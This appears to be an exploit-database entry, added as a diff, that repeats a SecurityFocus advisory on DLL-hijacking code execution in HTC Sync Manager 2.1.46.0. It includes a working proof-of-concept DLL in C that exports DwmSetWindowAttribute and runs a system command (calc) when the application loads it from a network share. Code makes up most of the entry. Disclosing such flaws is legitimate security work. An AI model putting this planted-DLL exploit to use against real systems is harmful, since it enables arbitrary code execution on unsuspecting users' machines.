@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/61745/info
+
+HTC Sync Manager is prone to multiple arbitrary code-execution vulnerabilities.
+
+An attacker can exploit these issues by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.
+
+HTC Sync Manager 2.1.46.0 is vulnerable; other versions may also be affected. 
+
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+DllExport void DwmSetWindowAttribute() { egg(); }
+
+int egg()
+{
+    system ("calc");
+        exit(0);
+        return 0;
+}
